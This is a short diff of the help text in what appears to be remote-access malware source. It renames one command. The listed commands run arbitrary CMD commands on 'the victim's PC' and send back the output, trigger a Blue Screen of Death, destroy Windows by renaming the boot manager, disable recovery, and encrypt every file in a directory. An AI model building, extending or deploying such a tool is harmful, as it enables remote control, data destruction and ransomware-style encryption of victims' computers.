@@ -419,7 +419,7 @@ help = {
         'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
         'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
         'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
-        'winbreak': ['➡️ `.winbreak`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
+        'break-windows': ['➡️ `.break-windows`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
         'disable-reset': ['➡️ `.disable-reset`', 'Disables windows recovery (ReAgentC)'],
         'enable-reset': ['➡️ `.enable-reset`', 'Enables windows recovery (ReAgentC)'],
         'encrypt': ['➡️ `.encrypt <directory>`', 'Encrypts every file in the specified directory'],
